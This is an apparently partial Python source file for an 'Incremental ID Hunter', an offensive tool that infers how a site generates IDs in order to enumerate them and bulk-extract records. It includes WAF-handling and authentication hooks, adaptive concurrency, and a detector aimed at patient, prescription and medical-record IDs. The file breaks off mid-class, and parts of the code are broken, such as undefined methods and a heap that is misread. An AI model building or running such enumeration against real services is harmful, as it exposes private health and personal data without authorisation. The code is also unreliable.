#!/usr/bin/env python3
"""
Incremental ID Hunter - 增量ID智能猎手
灵光一闪！自动识别ID生成规律，批量提取所有数据
"""

import asyncio
import aiohttp
import re
import json
import logging
from datetime import datetime, timedelta
from urllib.parse import urljoin
import ssl
import certifi
from collections import defaultdict, deque
import statistics
from dataclasses import dataclass, field
from typing import List, Dict, Set, Optional, Any, Tuple, Union
import time
import hashlib
import weakref
import gc
import heapq
import random
import math
import uuid
from concurrent.futures import ThreadPoolExecutor
import threading

# 导入 WAF Defender - 防止WAF欺骗响应
try:
    from .waf_defender import create_waf_defender, WAFDefender
    WAF_DEFENDER_AVAILABLE = True
except ImportError:
    try:
        # 尝试不使用相对导入
        from waf_defender import create_waf_defender, WAFDefender
        WAF_DEFENDER_AVAILABLE = True
    except ImportError:
        WAF_DEFENDER_AVAILABLE = False
        print("[!] WAF Defender 不可用 - 可能会受到WAF欺骗")

# 导入噪音过滤器 - 防止"傻逼兴奋"
try:
    from .third_party_blacklist import (
        smart_filter, 
        filter_third_party_urls,
        analyze_noise_level,
        is_third_party,
        has_security_value
    )
    NOISE_FILTER_AVAILABLE = True
except ImportError:
    try:
        # 尝试不使用相对导入
        from third_party_blacklist import (
            smart_filter, 
            filter_third_party_urls,
            analyze_noise_level,
            is_third_party,
            has_security_value
        )
        NOISE_FILTER_AVAILABLE = True
    except ImportError:
        NOISE_FILTER_AVAILABLE = False
        print("[!] 噪音过滤器 不可用 - 可能会有大量第三方服务噪音")

# 导入智能限流器
try:
    from smart_limits import SmartLimitManager, SystemSize
    SMART_LIMITS_AVAILABLE = True
except ImportError:
    SMART_LIMITS_AVAILABLE = False
    print("[!] 智能限流器 不可用")

# 导入认证管理器
try:
    from .auth_manager import AuthenticationManager, AuthConfig, create_auth_manager
    AUTH_MANAGER_AVAILABLE = True
except ImportError:
    AUTH_MANAGER_AVAILABLE = False
    print("[!] 认证管理器 不可用 - 无法访问认证后数据")

# 配置日志系统
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

@dataclass
class IDHunterConfig:
    """增量ID猎手配置管理"""
    
    # 性能控制配置
    max_concurrent_requests: int = 20
    request_timeout: int = 10
    max_retries: int = 3
    retry_delay: float = 0.5
    adaptive_delay: float = 0.1
    
    # 内存管理配置
    max_discovered_ids: int = 10000
    max_extracted_data: int = 5000
    cache_cleanup_interval: int = 100
    
    # ID生成配置
    max_numeric_range: int = 1000
    max_date_days: int = 30
    max_composite_range: int = 500
    max_sequence_per_date: int = 100
    
    # WAF和噪音过滤配置
    enable_waf_protection: bool = True
    enable_noise_filtering: bool = True
    noise_detection_threshold: float = 0.7
    waf_validation_sample_rate: float = 1.0  # 100%验证
    
    # 智能限流配置
    enable_smart_limits: bool = True
    system_size: str = 'medium'
    
    # 认证配置
    enable_authentication: bool = False
    auth_config: Dict[str, Any] = field(default_factory=dict)
    
    @classmethod
    def get_config(cls) -> Dict:
        """获取配置字典"""
        return {
            'max_concurrent_requests': cls.max_concurrent_requests,
            'request_timeout': cls.request_timeout,
            'max_retries': cls.max_retries,
            'enable_waf_protection': cls.enable_waf_protection,
            'enable_noise_filtering': cls.enable_noise_filtering,
            'enable_smart_limits': cls.enable_smart_limits
        }

@dataclass
class IDTask:
    """增强的ID任务数据结构"""
    priority: float
    id_value: str
    endpoint_pattern: str
    task_type: str  # 'discovery', 'validation', 'correlation'
    metadata: Dict[str, Any] = field(default_factory=dict)
    retry_count: int = 0
    max_retries: int = 3
    estimated_response_time: float = 1.0
    correlation_strength: float = 0.0  # ID关联强度
    learning_value: float = 0.0  # 学习价值
    
    def __lt__(self, other):
        return self.priority > other.priority  # 高优先级先执行
    
    def calculate_dynamic_priority(self, response_time_history: List[float], success_rate: float) -> float:
        """动态计算任务优先级"""
        base_priority = self.priority
        
        # 响应时间因子（快响应的端点优先级更高）
        if response_time_history:
            avg_response_time = statistics.mean(response_time_history)
            response_factor = 1.0 / (1.0 + avg_response_time)
        else:
            response_factor = 1.0
        
        # 成功率因子
        success_factor = success_rate
        
        # 关联强度因子
        correlation_factor = 1.0 + self.correlation_strength
        
        # 学习价值因子
        learning_factor = 1.0 + self.learning_value
        
        return base_priority * response_factor * success_factor * correlation_factor * learning_factor

class AdaptiveConcurrencyController:
    """自适应并发控制器 - 核心性能优化"""
    
    def __init__(self, initial_concurrency: int = 10, max_concurrency: int = 100, min_concurrency: int = 2):
        self.current_concurrency = initial_concurrency
        self.max_concurrency = max_concurrency
        self.min_concurrency = min_concurrency
        
        # 性能监控
        self.response_times = deque(maxlen=50)  # 最近50个响应时间
        self.error_rates = deque(maxlen=20)     # 最近20个错误率
        self.throughput_history = deque(maxlen=30)  # 吞吐量历史
        
        # 自适应参数
        self.target_response_time = 2.0  # 目标响应时间（秒）
        self.max_error_rate = 0.1        # 最大错误率
        self.adjustment_factor = 0.1     # 调整因子
        
        # 学习机制
        self.performance_snapshots = []  # 性能快照
        self.last_adjustment_time = time.time()
        self.adjustment_cooldown = 5.0   # 调整冷却时间
        
        self.semaphore = asyncio.Semaphore(self.current_concurrency)
        self._lock = asyncio.Lock()
    
    async def acquire(self):
        """获取并发许可"""
        return await self.semaphore.acquire()
    
    def release(self):
        """释放并发许可"""
        self.semaphore.release()
    
    async def record_performance(self, response_time: float, success: bool):
        """记录性能数据"""
        self.response_times.append(response_time)
        
        # 计算当前错误率
        current_errors = sum(1 for success in self.error_rates if not success)
        current_error_rate = current_errors / max(len(self.error_rates), 1)
        
        # 自适应调整
        await self._adaptive_adjustment(response_time, current_error_rate)
    
    async def _adaptive_adjustment(self, response_time: float, error_rate: float):
        """自适应并发调整"""
        current_time = time.time()
        
        # 冷却时间检查
        if current_time - self.last_adjustment_time < self.adjustment_cooldown:
            return
        
        async with self._lock:
            should_adjust = False
            adjustment = 0
            
            # 响应时间过慢，减少并发
            if response_time > self.target_response_time * 1.5:
                adjustment = -max(1, int(self.current_concurrency * self.adjustment_factor))
                should_adjust = True
                logger.debug(f"响应时间过慢 ({response_time:.2f}s)，减少并发")
            
            # 错误率过高，减少并发
            elif error_rate > self.max_error_rate:
                adjustment = -max(1, int(self.current_concurrency * self.adjustment_factor * 2))
                should_adjust = True
                logger.debug(f"错误率过高 ({error_rate:.2%})，减少并发")
            
            # 性能良好，尝试增加并发
            elif (response_time < self.target_response_time * 0.7 and 
                  error_rate < self.max_error_rate * 0.5 and
                  len(self.response_times) >= 10):
                
                # 计算吞吐量趋势
                if len(self.throughput_history) >= 3:
                    recent_throughput = statistics.mean(list(self.throughput_history)[-3:])
                    older_throughput = statistics.mean(list(self.throughput_history)[-10:-3]) if len(self.throughput_history) >= 10 else recent_throughput
                    
                    # 吞吐量在提升，可以增加并发
                    if recent_throughput >= older_throughput * 0.95:
                        adjustment = max(1, int(self.current_concurrency * self.adjustment_factor * 0.5))
                        should_adjust = True
                        logger.debug(f"性能良好，增加并发")
            
            if should_adjust:
                new_concurrency = max(self.min_concurrency, 
                                    min(self.max_concurrency, 
                                        self.current_concurrency + adjustment))
                
                if new_concurrency != self.current_concurrency:
                    logger.info(f"[*] 自适应并发调整: {self.current_concurrency} → {new_concurrency}")
                    await self._update_semaphore(new_concurrency)
                    self.current_concurrency = new_concurrency
                    self.last_adjustment_time = current_time
    
    async def _update_semaphore(self, new_concurrency: int):
        """更新信号量"""
        # 创建新的信号量
        old_semaphore = self.semaphore
        self.semaphore = asyncio.Semaphore(new_concurrency)
        
        # 如果减少并发，需要等待当前任务完成
        if new_concurrency < self.current_concurrency:
            # 等待多余的任务完成
            for _ in range(self.current_concurrency - new_concurrency):
                await old_semaphore.acquire()
    
    def get_performance_metrics(self) -> Dict[str, Any]:
        """获取性能指标"""
        if not self.response_times:
            return {'current_concurrency': self.current_concurrency}
        
        return {
            'current_concurrency': self.current_concurrency,
            'avg_response_time': statistics.mean(self.response_times),
            'p95_response_time': statistics.quantiles(self.response_times, n=20)[18] if len(self.response_times) >= 20 else max(self.response_times),
            'error_rate': sum(1 for rate in self.error_rates if rate) / max(len(self.error_rates), 1),
            'throughput_trend': list(self.throughput_history)[-5:] if self.throughput_history else []
        }

class PriorityTaskQueue:
    """优先级任务队列 - 高价值ID优先处理"""
    
    def __init__(self, max_size: int = 10000):
        self.heap = []
        self.max_size = max_size
        self.task_counter = 0  # 用于任务排序
        self._lock = asyncio.Lock()
        
        # 优先级统计
        self.priority_stats = {
            'high_priority_count': 0,
            'medium_priority_count': 0, 
            'low_priority_count': 0,
            'total_processed': 0
        }
        
        # 学习系统
        self.endpoint_performance = defaultdict(lambda: {
            'response_times': deque(maxlen=20),
            'success_rate': 1.0,
            'last_success_time': time.time()
        })
    
    async def put(self, task: IDTask):
        """添加任务到优先级队列"""
        async with self._lock:
            if len(self.heap) >= self.max_size:
                # 移除最低优先级任务
                if self.heap and task.priority > self.heap[0].priority:
                    heapq.heappop(self.heap)
                else:
                    return False  # 当前任务优先级太低
            
            # 动态计算优先级
            endpoint_perf = self.endpoint_performance[task.endpoint_pattern]
            task.priority = task.calculate_dynamic_priority(
                list(endpoint_perf['response_times']),
                endpoint_perf['success_rate']
            )
            
            # 添加到堆中
            heapq.heappush(self.heap, (task.priority, self.task_counter, task))
            self.task_counter += 1
            
            # 更新统计
            if task.priority >= 0.8:
                self.priority_stats['high_priority_count'] += 1
            elif task.priority >= 0.5:
                self.priority_stats['medium_priority_count'] += 1
            else:
                self.priority_stats['low_priority_count'] += 1
            
            return True
    
    async def get(self) -> Optional[IDTask]:
        """获取最高优先级任务"""
        async with self._lock:
            if not self.heap:
                return None
            
            _, _, task = heapq.heappop(self.heap)
            self.priority_stats['total_processed'] += 1
            return task
    
    async def get_batch(self, batch_size: int) -> List[IDTask]:
        """批量获取高优先级任务"""
        tasks = []
        for _ in range(batch_size):
            task = await self.get()
            if task:
                tasks.append(task)
            else:
                break
        return tasks
    
    def update_task_performance(self, endpoint_pattern: str, response_time: float, success: bool):
        """更新任务性能数据"""
        perf = self.endpoint_performance[endpoint_pattern]
        perf['response_times'].append(response_time)
        
        # 更新成功率（指数移动平均）
        alpha = 0.1  # 学习率
        perf['success_rate'] = (1 - alpha) * perf['success_rate'] + alpha * (1.0 if success else 0.0)
        
        if success:
            perf['last_success_time'] = time.time()
    
    def get_queue_stats(self) -> Dict[str, Any]:
        """获取队列统计"""
        return {
            'queue_size': len(self.heap),
            'priority_distribution': self.priority_stats.copy(),
            'endpoint_performance': {
                pattern: {
                    'avg_response_time': statistics.mean(perf['response_times']) if perf['response_times'] else 0,
                    'success_rate': perf['success_rate'],
                    'last_success_age': time.time() - perf['last_success_time']
                }
                for pattern, perf in list(self.endpoint_performance.items())[:10]  # 只显示前10个
            }
        }
    
    def size(self) -> int:
        """获取队列大小"""
        return len(self.heap)
    
    def empty(self) -> bool:
        """检查队列是否为空"""
        return len(self.heap) == 0

@dataclass
class PerformanceMetrics:
    """性能监控指标"""
    
    def __init__(self):
        self.start_time = time.time()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.waf_blocked_requests = 0
        self.noise_filtered_count = 0
        self.cache_hits = 0
        self.cache_misses = 0
        self.response_times = []
        self.error_types = defaultdict(int)
        self.memory_usage_samples = []
        
    def record_request(self, success: bool, response_time: float = 0, error_type: str = None):
        """记录请求结果"""
        self.total_requests += 1
        if success:
            self.successful_requests += 1
        else:
            self.failed_requests += 1
            if error_type:
                self.error_types[error_type] += 1
        
        if response_time > 0:
            self.response_times.append(response_time)
    
    def record_waf_block(self):
        """记录WAF阻拦"""
        self.waf_blocked_requests += 1
    
    def record_noise_filter(self):
        """记录噪音过滤"""
        self.noise_filtered_count += 1
    
    def record_cache_hit(self, hit: bool):
        """记录缓存命中"""
        if hit:
            self.cache_hits += 1
        else:
            self.cache_misses += 1
    
    def get_stats(self) -> Dict:
        """获取统计信息"""
        elapsed_time = time.time() - self.start_time
        avg_response_time = statistics.mean(self.response_times) if self.response_times else 0
        
        return {
            'elapsed_time': elapsed_time,
            'total_requests': self.total_requests,
            'successful_requests': self.successful_requests,
            'failed_requests': self.failed_requests,
            'success_rate': self.successful_requests / max(self.total_requests, 1),
            'waf_blocked_requests': self.waf_blocked_requests,
            'noise_filtered_count': self.noise_filtered_count,
            'cache_hit_rate': self.cache_hits / max(self.cache_hits + self.cache_misses, 1),
            'avg_response_time': avg_response_time,
            'requests_per_second': self.total_requests / max(elapsed_time, 1),
            'error_types': dict(self.error_types)
        }

class AdvancedIDRecognizer:
    """高级ID识别器 - 多格式学习和雪花算法支持"""
    
    def __init__(self):
        self.learned_patterns = {}
        self.snowflake_detector = SnowflakeIDDetector()
        self.medical_id_detector = MedicalIDDetector()
        self.format_learner = IDFormatLearner()
        
        # 识别历史
        self.recognition_history = defaultdict(list)
        self.success_patterns = defaultdict(int)
        
        # 动态格式库
        self.dynamic_formats = {}
        
    def analyze_id_comprehensive(self, ids: List[str]) -> Dict[str, Any]:
        """综合ID分析"""
        results = {}
        
        # 1. 传统格式分析
        results.update(self._analyze_traditional_formats(ids))
        
        # 2. 雪花算法检测
        snowflake_result = self.snowflake_detector.detect_snowflake_ids(ids)
        if snowflake_result:
            results['snowflake'] = snowflake_result
        
        # 3. 医疗ID特化检测
        medical_result = self.medical_id_detector.detect_medical_ids(ids)
        if medical_result:
            results['medical'] = medical_result
        
        # 4. 动态格式学习
        learned_result = self.format_learner.learn_from_successful_ids(ids)
        if learned_result:
            results['learned'] = learned_result
        
        # 5. 更新学习模型
        self._update_learning_model(ids, results)
        
        return results
    
    def _analyze_traditional_formats(self, ids: List[str]) -> Dict[str, Any]:
        """分析传统格式"""
        results = {}
        
        # 数字序列检测
        numeric_result = self._analyze_numeric_sequence(ids)
        if numeric_result:
            results['numeric'] = numeric_result
        
        # 日期格式检测（增强版）
        date_result = self._analyze_enhanced_date_formats(ids)
        if date_result:
            results['date_based'] = date_result
        
        # 复合格式检测
        composite_result = self._analyze_composite_formats(ids)
        if composite_result:
            results['composite'] = composite_result
        
        return results
    
    def _analyze_enhanced_date_formats(self, ids: List[str]) -> Optional[Dict[str, Any]]:
        """增强的日期格式分析"""
        date_patterns = []
        
        # 支持多种日期格式
        date_formats = [
            (r'^(\d{8})(\d+)$', '%Y%m%d'),      # YYYYMMDD + 序号
            (r'^(\d{6})(\d+)$', '%Y%m'),        # YYYYMM + 序号  
            (r'^(\d{4})(\d{2})(\d{2})(\d+)$', '%Y%m%d'),  # YYYY MM DD + 序号
            (r'^(\d{4})-(\d{2})-(\d{2})-(\d+)$', '%Y-%m-%d'),  # YYYY-MM-DD-序号
            (r'^(\d{4})\.(\d{2})\.(\d{2})\.(\d+)$', '%Y.%m.%d'),  # YYYY.MM.DD.序号
        ]
        
        for id_str in ids:
            for pattern, date_format in date_formats:
                match = re.match(pattern, str(id_str))
                if match:
                    try:
                        groups = match.groups()
                        if len(groups) >= 2:
                            date_part = groups[0] if len(groups) == 2 else f"{groups[0]}{groups[1]}{groups[2]}"
                            seq_part = groups[-1]
                            
                            # 验证日期有效性
                            if date_format == '%Y%m':
                                datetime.strptime(date_part, date_format)
                            else:
                                datetime.strptime(date_part, date_format.replace('-', '').replace('.', ''))
                            
                            date_patterns.append({
                                'date': date_part,
                                'sequence': int(seq_part),
                                'seq_length': len(seq_part),
                                'full_id': id_str,
                                'format': date_format,
                                'pattern': pattern
                            })
                    except (ValueError, TypeError):
                        continue
        
        if date_patterns:
            # 分析最佳格式
            format_counts = defaultdict(int)
            for p in date_patterns:
                format_counts[p['format']] += 1
            
            best_format = max(format_counts.items(), key=lambda x: x[1])
            
            return {
                'type': 'enhanced_date_sequence',
                'best_format': best_format[0],
                'patterns_found': len(date_patterns),
                'sample_patterns': date_patterns[:5],
                'sequence_analysis': self._analyze_sequence_patterns([p['sequence'] for p in date_patterns])
            }
        
        return None
    
    def _analyze_sequence_patterns(self, sequences: List[int]) -> Dict[str, Any]:
        """分析序号模式"""
        if len(sequences) < 2:
            return {'type': 'insufficient_data'}
        
        sequences = sorted(sequences)
        diffs = [sequences[i+1] - sequences[i] for i in range(len(sequences)-1)]
        
        # 检查等差数列
        if diffs and all(d == diffs[0] for d in diffs):
            return {
                'type': 'arithmetic',
                'step': diffs[0],
                'predictable': True
            }
        
        # 检查随机但有范围
        if diffs:
            return {
                'type': 'random_range',
                'min_step': min(diffs),
                'max_step': max(diffs),
                'avg_step': statistics.mean(diffs),
                'predictable': False
            }
        
        return {'type': 'unknown'}
    
    def _update_learning_model(self, ids: List[str], results: Dict[str, Any]):
        """更新学习模型"""
        for pattern_type, pattern_info in results.items():
            if pattern_type in ['snowflake', 'medical', 'learned']:
                self.success_patterns[pattern_type] += len(ids)
                
                # 更新动态格式库
                if pattern_type not in self.dynamic_formats:
                    self.dynamic_formats[pattern_type] = pattern_info
                else:
                    # 合并和更新现有格式
                    self._merge_pattern_info(pattern_type, pattern_info)

class SnowflakeIDDetector:
    """雪花算法ID检测器"""
    
    def __init__(self):
        # 雪花算法配置
        self.epoch_start = 1609459200000  # 2021-01-01 00:00:00 UTC in milliseconds
        self.machine_id_bits = 10
        self.sequence_bits = 12
        
    def detect_snowflake_ids(self, ids: List[str]) -> Optional[Dict[str, Any]]:
        """检测雪花算法ID"""
        snowflake_candidates = []
        
        for id_str in ids:
            if self._is_likely_snowflake(str(id_str)):
                parsed = self._parse_snowflake(str(id_str))
                if parsed:
                    snowflake_candidates.append(parsed)
        
        if len(snowflake_candidates) >= 2:
            return {
                'type': 'snowflake',
                'candidates_count': len(snowflake_candidates),
                'time_range': self._analyze_snowflake_time_range(snowflake_candidates),
                'machine_ids': list(set(c['machine_id'] for c in snowflake_candidates)),
                'sample_ids': snowflake_candidates[:3]
            }
        
        return None
    
    def _is_likely_snowflake(self, id_str: str) -> bool:
        """判断是否可能是雪花算法ID"""
        try:
            id_int = int(id_str)
            # 雪花ID通常是19位数字
            if 15 <= len(id_str) <= 20:
                # 检查时间戳部分是否合理
                timestamp = id_int >> (self.machine_id_bits + self.sequence_bits)
                timestamp_ms = timestamp + self.epoch_start
                
                # 检查时间是否在合理范围内（2021-2030）
                if 1609459200000 <= timestamp_ms <= 1893456000000:
                    return True
        except (ValueError, OverflowError):
            pass
        
        return False
    
    def _parse_snowflake(self, id_str: str) -> Optional[Dict[str, Any]]:
        """解析雪花算法ID"""
        try:
            id_int = int(id_str)
            
            # 提取各部分
            sequence = id_int & ((1 << self.sequence_bits) - 1)
            machine_id = (id_int >> self.sequence_bits) & ((1 << self.machine_id_bits) - 1)
            timestamp = id_int >> (self.machine_id_bits + self.sequence_bits)
            
            timestamp_ms = timestamp + self.epoch_start
            dt = datetime.fromtimestamp(timestamp_ms / 1000)
            
            return {
                'original_id': id_str,
                'timestamp': timestamp,
                'machine_id': machine_id,
                'sequence': sequence,
                'datetime': dt.isoformat(),
                'timestamp_ms': timestamp_ms
            }
        except Exception:
            return None
    
    def _analyze_snowflake_time_range(self, snowflakes: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析雪花ID的时间范围"""
        timestamps = [s['timestamp_ms'] for s in snowflakes]
        timestamps.sort()
        
        return {
            'start_time': datetime.fromtimestamp(min(timestamps) / 1000).isoformat(),
            'end_time': datetime.fromtimestamp(max(timestamps) / 1000).isoformat(),
            'time_span_hours': (max(timestamps) - min(timestamps)) / (1000 * 3600),
            'generation_rate': len(snowflakes) / max(1, (max(timestamps) - min(timestamps)) / 1000)  # IDs per second
        }

class MedicalIDDetector:
    """医疗ID检测器 - 特化检测"""
    
    def __init__(self):
        # 医疗ID模式
        self.medical_patterns = {
            'patient': [
                r'^P\d{4,8}$',              # P1234, P12345678
                r'^PT-\d{4}-\d{3,6}$',      # PT-2024-001
                r'^PAT\d{6,10}$',           # PAT123456
                r'^\d{4}PT\d{4}$',          # 2024PT0001
            ],
            'appointment': [
                r'^A\d{4,8}$',              # A1234
                r'^APT-\d{4}-\d{3,6}$',     # APT-2024-001
                r'^APPT\d{6,10}$',          # APPT123456
                r'^\d{8}A\d{3,4}$',         # 20240101A001
            ],
            'prescription': [
                r'^RX\d{4,8}$',             # RX1234
                r'^PR-\d{4}-\d{3,6}$',      # PR-2024-001
                r'^MED\d{6,10}$',           # MED123456
                r'^\d{8}RX\d{3,4}$',        # 20240101RX001
            ],
            'medical_record': [
                r'^MR\d{4,8}$',             # MR1234
                r'^REC-\d{4}-\d{3,6}$',     # REC-2024-001
                r'^CHT\d{6,10}$',           # CHT123456 (Chart)
                r'^\d{8}MR\d{3,4}$',        # 20240101MR001
            ]
        }
        
        # 日文医疗模式
        self.japanese_patterns = {
            'patient': [r'^K\d{4,8}$', r'^KJ\d{4,8}$'],      # 患者(Kanja)
            'appointment': [r'^Y\d{4,8}$', r'^YY\d{4,8}$'],  # 予約(Yoyaku)
        }
    
    def detect_medical_ids(self, ids: List[str]) -> Optional[Dict[str, Any]]:
        """检测医疗ID模式"""
        medical_matches = defaultdict(list)
        
        for id_str in ids:
            # 检查标准医疗模式
            for category, patterns in self.medical_patterns.items():
                for pattern in patterns:
                    if re.match(pattern, str(id_str), re.IGNORECASE):
                        medical_matches[category].append({
                            'id': id_str,
                            'pattern': pattern,
                            'category': category
                        })
                        break
            
            # 检查日文模式
            for category, patterns in self.japanese_patterns.items():
                for pattern in patterns:
                    if re.match(pattern, str(id_str), re.IGNORECASE):
                        medical_matches[f'japanese_{category}'].append({
                            'id': id_str,
                            'pattern': pattern,
                            'category': f'japanese_{category}'
                        })
                        break
        
        if medical_matches:
            return {
                'type': 'medical_specialized',
                'categories_found': list(medical_matches.keys()),
                'total_medical_ids': sum(len(matches) for matches in medical_matches.values()),
                'pattern_analysis': self._analyze_medical_patterns(medical_matches),
                'correlation_potential': self._calculate_correlation_potential(medical_matches)
            }
        
        return None
    
    def _analyze_medical_patterns(self, matches: Dict[str, List]) -> Dict[str, Any]:
        """分析医疗ID模式"""
        analysis = {}
        
        for category, id_list in matches.items():
            if id_list:
                # 提取数字部分进行分析
                numbers = []
                for item in id_list:
                    id_str = item['id']
                    # 提取所有数字
                    digits = re.findall(r'\d+', id_str)
                    if digits:
                        try:
                            numbers.extend([int(d) for d in digits])
                        except ValueError:
                            continue
                
                if numbers:
                    analysis[category] = {
                        'count': len(id_list),
                        'number_range': (min(numbers), max(numbers)),
                        'sample_ids': [item['id'] for item in id_list[:3]],
                        'generation_pattern': self._detect_generation_pattern(numbers)
                    }
        
        return analysis
    
    def _detect_generation_pattern(self, numbers: List[int]) -> str:
        """检测生成模式"""
        if len(numbers) < 2:
            return 'insufficient_data'
        
        numbers = sorted(set(numbers))
        diffs = [numbers[i+1] - numbers[i] for i in range(len(numbers)-1)]
        
        if diffs and all(d == 1 for d in diffs):
            return 'sequential'
        elif diffs and all(d == diffs[0] for d in diffs):
            return f'arithmetic_step_{diffs[0]}'
        elif max(numbers) - min(numbers) < len(numbers) * 10:
            return 'dense_random'
        else:
            return 'sparse_random'
    
    def _calculate_correlation_potential(self, matches: Dict[str, List]) -> float:
        """计算关联潜力分数"""
        categories = len(matches)
        total_ids = sum(len(ids) for ids in matches.values())
        
        # 基础分数：类别越多，关联潜力越高
        base_score = min(categories / 4.0, 1.0)  # 最多4个主要类别
        
        # 数量因子：每个类别有足够的ID样本
        quantity_factor = min(total_ids / 20.0, 1.0)  # 20个ID为满分
        
        # 平衡因子：各类别ID数量相对平衡
        if categories > 1:
            id_counts = [len(ids) for ids in matches.values()]
            balance_factor = min(id_counts) / max(id_counts)
        else:
            balance_factor = 1.0
        
        return base_score * quantity_factor * balance_factor

class IDFormatLearner:
    """ID格式学习器 - 从成功响应学习"""
    
    def __init__(self):
        self.learned_formats = {}
        self.learning_samples = defaultdict(list)
        self.format_confidence = defaultdict(float)
        
    def learn_from_successful_ids(self, successful_ids: List[str]) -> Optional[Dict[str, Any]]:
        """从成功的ID中学习格式"""
        if len(successful_ids) < 3:
            return None
        
        # 提取格式特征
        format_features = []
        for id_str in successful_ids:
            features = self._extract_format_features(str(id_str))
            if features:
                format_features.append(features)
        
        if not format_features:
            return None
        
        # 聚类相似格式
        format_clusters = self._cluster_formats(format_features)
        
        # 生成学习结果
        if format_clusters:
            return {
                'type': 'learned_formats',
                'clusters_found': len(format_clusters),
                'format_patterns': format_clusters,
                'learning_confidence': self._calculate_learning_confidence(format_clusters),
                'generation_rules': self._generate_format_rules(format_clusters)
            }
        
        return None
    
    def _extract_format_features(self, id_str: str) -> Optional[Dict[str, Any]]:
        """提取ID格式特征"""
        features = {
            'length': len(id_str),
            'digit_count': sum(c.isdigit() for c in id_str),
            'alpha_count': sum(c.isalpha() for c in id_str),
            'special_count': sum(not c.isalnum() for c in id_str),
            'structure': self._analyze_structure(id_str),
            'prefix': self._extract_prefix(id_str),
            'suffix': self._extract_suffix(id_str),
            'numeric_parts': re.findall(r'\d+', id_str),
            'alpha_parts': re.findall(r'[a-zA-Z]+', id_str)
        }
        
        return features
    
    def _analyze_structure(self, id_str: str) -> str:
        """分析ID结构"""
        structure = ""
        for char in id_str:
            if char.isdigit():
                if not structure.endswith('N'):
                    structure += 'N'
            elif char.isalpha():
                if not structure.endswith('A'):
                    structure += 'A'
            else:
                structure += 'S'  # Special character
        
        return structure
    
    def _extract_prefix(self, id_str: str) -> str:
        """提取前缀"""
        match = re.match(r'^([a-zA-Z]+)', id_str)
        return match.group(1) if match else ""
    
    def _extract_suffix(self, id_str: str) -> str:
        """提取后缀"""
        match = re.search(r'([a-zA-Z]+)$', id_str)
        return match.group(1) if match else ""
    
    def _cluster_formats(self, features_list: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """聚类相似格式"""
        clusters = []
        
        # 按结构分组
        structure_groups = defaultdict(list)
        for features in features_list:
            structure_groups[features['structure']].append(features)
        
        for structure, group_features in structure_groups.items():
            if len(group_features) >= 2:  # 至少需要2个样本
                cluster = {
                    'structure': structure,
                    'sample_count': len(group_features),
                    'length_range': (
                        min(f['length'] for f in group_features),
                        max(f['length'] for f in group_features)
                    ),
                    'common_prefix': self._find_common_prefix([f['prefix'] for f in group_features]),
                    'common_suffix': self._find_common_suffix([f['suffix'] for f in group_features]),
                    'numeric_patterns': self._analyze_numeric_patterns(group_features)
                }
                clusters.append(cluster)
        
        return clusters
    
    def _find_common_prefix(self, prefixes: List[str]) -> str:
        """找到共同前缀"""
        prefixes = [p for p in prefixes if p]
        if not prefixes:
            return ""
        
        common = ""
        for i in range(min(len(p) for p in prefixes)):
            char = prefixes[0][i]
            if all(p[i] == char for p in prefixes):
                common += char
            else:
                break
        
        return common
    
    def _find_common_suffix(self, suffixes: List[str]) -> str:
        """找到共同后缀"""
        suffixes = [s for s in suffixes if s]
        if not suffixes:
            return ""
        
        common = ""
        min_len = min(len(s) for s in suffixes)
        
        for i in range(1, min_len + 1):
            char = suffixes[0][-i]
            if all(s[-i] == char for s in suffixes):
                common = char + common
            else:
                break
        
        return common
    
    def _analyze_numeric_patterns(self, features_list: List[Dict[str, Any]]) -> Dict[str, Any]:
        """分析数字模式"""
        all_numeric_parts = []
        for features in features_list:
            for part in features['numeric_parts']:
                try:
                    all_numeric_parts.append(int(part))
                except ValueError:
                    continue
        
        if not all_numeric_parts:
            return {'type': 'no_numeric'}
        
        all_numeric_parts.sort()
        
        return {
            'count': len(all_numeric_parts),
            'range': (min(all_numeric_parts), max(all_numeric_parts)),
            'length_distribution': self._analyze_number_lengths(features_list),
            'sequence_type': self._detect_sequence_type(all_numeric_parts)
        }
    
    def _analyze_number_lengths(self, features_list: List[Dict[str, Any]]) -> Dict[int, int]:
        """分析数字长度分布"""
        length_counts = defaultdict(int)
        for features in features_list:
            for part in features['numeric_parts']:
                length_counts[len(part)] += 1
        
        return dict(length_counts)
    
    def _detect_sequence_type(self, numbers: List[int]) -> str:
        """检测序列类型"""
        if len(numbers) < 2:
            return 'single'
        
        diffs = [numbers[i+1] - numbers[i] for i in range(len(numbers)-1)]
        
        if all(d == 1 for d in diffs):
            return 'consecutive'
        elif all(d == diffs[0] for d in diffs):
            return f'arithmetic_{diffs[0]}'
        elif all(d > 0 for d in diffs):
            return 'increasing'
        else:
            return 'random'
    
    def _calculate_learning_confidence(self, clusters: List[Dict[str, Any]]) -> float:
        """计算学习置信度"""
        if not clusters:
            return 0.0
        
        # 基于样本数量和一致性
        total_samples = sum(cluster['sample_count'] for cluster in clusters)
        largest_cluster_size = max(cluster['sample_count'] for cluster in clusters)
        
        # 样本数量因子
        sample_factor = min(total_samples / 10.0, 1.0)
        
        # 一致性因子（最大集群占比）
        consistency_factor = largest_cluster_size / total_samples
        
        return sample_factor * consistency_factor
    
    def _generate_format_rules(self, clusters: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """生成格式规则"""
        rules = []
        
        for cluster in clusters:
            rule = {
                'structure': cluster['structure'],
                'prefix': cluster['common_prefix'],
                'suffix': cluster['common_suffix'],
                'length_range': cluster['length_range'],
                'generation_strategy': self._create_generation_strategy(cluster)
            }
            rules.append(rule)
        
        return rules
    
    def _create_generation_strategy(self, cluster: Dict[str, Any]) -> Dict[str, str]:
        """创建生成策略"""
        numeric_patterns = cluster['numeric_patterns']
        
        if numeric_patterns['sequence_type'] == 'consecutive':
            return {
                'type': 'sequential',
                'description': '连续数字序列'
            }
        elif numeric_patterns['sequence_type'].startswith('arithmetic_'):
            step = numeric_patterns['sequence_type'].split('_')[1]
            return {
                'type': 'arithmetic',
                'step': int(step),
                'description': f'等差数列，步长{step}'
            }
        else:
            return {
                'type': 'range_random',
                'range': numeric_patterns['range'],
                'description': '范围内随机生成'
            }

class IntelligentFormExtractor:
    """智能表单提取器 - 数据完整性保证"""
    
    def __init__(self):
        self.form_patterns = {}
        self.field_recognizer = FormFieldRecognizer()
